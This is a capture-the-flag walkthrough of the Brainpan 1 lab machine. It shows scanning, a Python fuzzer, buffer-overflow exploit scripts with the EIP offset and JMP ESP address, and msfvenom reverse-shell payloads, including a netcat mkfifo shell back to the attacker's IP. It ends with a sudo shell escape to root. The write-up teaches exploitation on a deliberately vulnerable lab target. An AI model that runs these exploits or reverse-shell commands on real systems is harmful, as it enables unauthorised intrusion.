# Brainpan 1 Walkthrough
Following is the outcome of my adventure with Brainpan: 1 
Without further delay, let's start the party.

## 1. Initial Scan

`nmap -sV -sT -v -p- -T4 192.168.21.130`

```
PORT      STATE SERVICE VERSION
9999/tcp  open  abyss?
10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)
...
...
...
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6.32
OS details: Linux 2.6.32
Uptime guess: 8.367 days (since Tue Feb 25 05:58:00 2020)
Network Distance: 0 hops
TCP Sequence Prediction: Difficulty=258 (Good luck!)
IP ID Sequence Generation: All zeros
```

![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Brainpan%3A%201/img/welcome-to-brainpan.png)

* custom application running in Wine on port 9999
* python SimpleHTTPServer on port 10000

**Nikto** might be helpful at this moment

`nikto -h 192.168.56.106`

![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Brainpan%3A%201/img/nikto-scan-output.png)

It tells us about the mysterious `bin` directory
Let's browse the website and look inside it

`192.168.56.106:10000/bin/`

A suspicious app binary is waiting there for us - maybe it's the key for solving this puzzle? 

We won't know unless we check it out. Let's run the `strings` command to view the hardcoded strings within the binary

![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Brainpan%3A%201/img/strings-output.png)

The `shitstorm` line instantly draws the attention - it may be a password to a certain service!
We are gonna give it a try:

![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Brainpan%3A%201/img/192.168.56.106%209999.png)

It looks useless. I also used telnet but still nothing, the application responded with the following: Connection closed by foreign host.

The app behaves as if it were a kind of a server. After opening the socket it waits for connection, checks the input and then drops.

## 2. Some scripting & fuzzing 

Preinstalled Immunity Debugger on Windows 32-bit VM may come in handy here.

**In the first round** we're gonna send a long, repeated string of A's with a simple fuzzer visible below. By running the script, the terminal will tell us whether providing sufficiently long input can crash the app:

```
import socket

for i in range(30):
  s = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
  s.connect(("192.168.56.105",9999)) # mind to change the IP address :-)
  payload = int(i)*("A"*100)
  s.send(payload+"\r\n")
  print "[*] Sending buffer data with " + str(len(str(payload))) + " A's\r\n"
  s.close()
```

Running the code provides us with the following output:

![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Brainpan%3A%201/img/python-fuzzer-output.png)

Turns out that the overflow occurs around the length of 900 A's.

In Immunity we notice that the EIP has been overwritten with 41414141 (Hex representation of four A's). It also says that an *Access violation* occurs while executing the code at address 41414141.

## 3. Finding EIP location

As the vulnerability is known and it's obvious that we've gained control over replacing the EIP address, it brings us closer to our goal.

Firstly, we need to find the offset that could control the EIP. We're gonna utilize a Metasploit feature and create a pattern consisting of a set of unique, three-character substrings: 

![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Brainpan%3A%201/img/pattern-create-ruby.png)

It spits out a unique and random set that perfectly fits to our payload.
```
import socket

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('192.168.56.105',9999))

payload = ("Put the pattern here")

print s.recv(1024)
s.send(payload)
print s.recv(1024)

s.close()
```
Execution of the script causes *Access violation* again and leads to crash:

![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Brainpan%3A%201/img/overwriting-eip.png)

As you can see above, the pattern inside the EIP is **35724134**

After having the pattern located inside the instruction pointer (EIP), let's determine the offset (known as the exact location of the address) and make it point to our malicious shellcode, which we will craft later on.

`ruby pattern_offset.rb -q 35724134`

![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Brainpan%3A%201/img/pattern-offset-ruby.png)

Exactly 524 bytes of junk data is needed to get us to the EIP.

Now our payload will look like this: `"A"*524+"B"*4+"C"*(900-524-4)`

```
import socket

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('192.168.56.105',9999))

payload = "A"*524 + "B"*4 + "C"*(900-524-4)

print s.recv(1024)
s.send(payload+"\r\n")
print s.recv(1024)

s.close()
```
As we could have expected, after executing this script the EIP gets overwritten with 42424242 (the HEX code of "B" is 0x42). Now we have full control over the EIP.

![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Brainpan%3A%201/img/Access-violation-42424242.png)

Setting JMP ESP address

`!mona jmp -r ESP`

Quick glance at the `jmp.txt` output file from mona and we see something helpful:
```
 Module info :
-----------------------------------------------------------------------------------------------------------------------------------------
 Base       | Top        | Size       | Rebase | SafeSEH | ASLR  | NXCompat | OS Dll | Version, Modulename & Path
-----------------------------------------------------------------------------------------------------------------------------------------
 0x750a0000 | 0x750aa000 | 0x0000a000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [LPK.dll] (C:\Windows\syswow64\LPK.dll)
 0x76bc0000 | 0x76bc6000 | 0x00006000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [NSI.dll] (C:\Windows\syswow64\NSI.dll)
 0x74fd0000 | 0x7509c000 | 0x000cc000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [MSCTF.dll] (C:\Windows\syswow64\MSCTF.dll)
 0x76f50000 | 0x76f96000 | 0x00046000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [KERNELBASE.dll] (C:\Windows\syswow64\KERNELBASE.dll)
 0x76fa0000 | 0x76fd5000 | 0x00035000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [WS2_32.DLL] (C:\Windows\syswow64\WS2_32.DLL)
 0x747b0000 | 0x747ec000 | 0x0003c000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [mswsock.dll] (C:\Windows\system32\mswsock.dll)
 0x750b0000 | 0x7514d000 | 0x0009d000 | True   | True    | True  |  True    | True   | 1.0626.7601.17514 [USP10.dll] (C:\Windows\syswow64\USP10.dll)
 0x76c00000 | 0x76c90000 | 0x00090000 | True   | True    | True  |  True    | True   | 6.1.7601.17514 [GDI32.dll] (C:\Windows\syswow64\GDI32.dll)
 0x31170000 | 0x31176000 | 0x00006000 | False  | False   | False |  False   | False  | -1.0- [brainpan.exe] (C:\Users\wojtek\Desktop\brainpan.exe)
 0x76a20000 | 0x76b30000 | 0x00110000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [kernel32.dll] (C:\Windows\syswow64\kernel32.dll)
 0x76ea0000 | 0x76f4c000 | 0x000ac000 | True   | True    | True  |  True    | True   | 7.0.7600.16385 [msvcrt.dll] (C:\Windows\syswow64\msvcrt.dll)
 0x74f30000 | 0x74f3c000 | 0x0000c000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [CRYPTBASE.dll] (C:\Windows\syswow64\CRYPTBASE.dll)
 0x74f40000 | 0x74fa0000 | 0x00060000 | True   | True    | True  |  True    | True   | 6.1.7601.17514 [SspiCli.dll] (C:\Windows\syswow64\SspiCli.dll)
 0x773e0000 | 0x77560000 | 0x00180000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [ntdll.dll] (C:\Windows\SysWOW64\ntdll.dll)
 0x759b0000 | 0x75a50000 | 0x000a0000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [ADVAPI32.dll] (C:\Windows\syswow64\ADVAPI32.dll)
 0x75160000 | 0x75250000 | 0x000f0000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [RPCRT4.dll] (C:\Windows\syswow64\RPCRT4.dll)
 0x75780000 | 0x75799000 | 0x00019000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [sechost.dll] (C:\Windows\SysWOW64\sechost.dll)
 0x75ae0000 | 0x75be0000 | 0x00100000 | True   | True    | True  |  True    | True   | 6.1.7601.17514 [user32.dll] (C:\Windows\syswow64\user32.dll)
 0x76b60000 | 0x76bc0000 | 0x00060000 | True   | True    | True  |  True    | True   | 6.1.7601.17514 [IMM32.DLL] (C:\Windows\system32\IMM32.DLL)
-----------------------------------------------------------------------------------------------------------------------------------------
0x311712f3 : jmp esp |  {PAGE_EXECUTE_READ} [brainpan.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\wojtek\Desktop\brainpan.exe)
```

`0x31170000` <- module with no SafeSEH and ASLR protection

And we find the JMP ESP address

![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Brainpan%3A%201/img/JMP-ESP-address.png)

## 4. Shellcode payload and reverse shell

* Brainpan's IP - 192.168.56.106
* Attacker's IP - 192.168.56.101
* Windows IP - 192.168.56.105

`msfvenom -p windows/shell_reverse_tcp lhost=192.168.56.101 lport=4444 -f c -b "\x00"`

![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Brainpan%3A%201/img/msfvenom-windows-shell-reverse-tcp.png)

```
import socket

buf = ("\xb8\xf9\...\...\...\..."
"\xc9\xb1\...\..\...\...\...\..."
"...
"...
...
"\x..\x..\x..\x..") 

payload = "A"*524 + "\xf3\x12\x17\x31" + "\x90"*16 + buf
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
  s.connect(('192.168.56.106',9999))
except:
  print "Error"
  sys.exit(0)

s.recv(1024)
s.send(payload)
```
Time for important question. Why the appearance of multiple `"\x90"` inside our payload variable?

Finding the single entry point is a lot of work. **NOP "sleds"** make this easier by making it so that we only need to be close. How do we do this? By executing NOP (or equivalent) instructions.

Just place a **"NOP sled"** in front of the shellcode and try to point the return address into the sled.

0x90 is the op-code for no operation `"NOP"`. NOPs go on to the next operation, not causing anything to happen. They are used for so called trail padding, so if we jump to the memory location of any of them, they will just fast forward to our actual code.


![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Brainpan%3A%201/img/nc-nlvp-4444.png)

It was really confusing at first. Notice the CMD 1.4.1 label? This is because the windows executable is running through Wine on a Linux machine. Time to switch to Linux shell.

`msfvenom -p linux/x86/exec CMD="mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.56.101 4444 >/tmp/f" -b "\x00" -f py`

![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Brainpan%3A%201/img/msfvenom-linux-x86-exec-shell.png)

...and swap the shellcode in our python script after setting up the netcat once again.

## 5. Privilege escalation
![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Brainpan%3A%201/img/netcat-and-python-shell.png)

Good, we're back in the game!
Spawning a tty shell -> check `id` -> list the directory `ls -la` -> `cat checksrv.sh` -> and check the local users

![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Brainpan%3A%201/img/further-enumeration-shell.png)
`cat group`
![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Brainpan%3A%201/img/cat-group.png)
`cat passwd` -> `ls` -> `cd /opt` -> `cd /etc`
![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Brainpan%3A%201/img/cat-passwd.png)
`ls -la sudoers`
![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Brainpan%3A%201/img/ls-la-sudoers.png)
`sudo /home/anansi/bin/anasi_util`
![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Brainpan%3A%201/img/sudo-home-anansi-bin-anansi-util.png)
`sudo /home/anansi/bin/anasi_util manual /etc/sudoers`
![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Brainpan%3A%201/img/sudo-home-anansi-bin-anansi-util-etc-sudoers.png)
`!/bin/bash`
And finally!
![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Brainpan%3A%201/img/root%40brainpan.png)

## Conclusion
It is a great opportunity to improve:
- understanding of buffer overflow
- scripting skills,
- fundamentals of Immunity Debugger,

Thank you for your attention :)
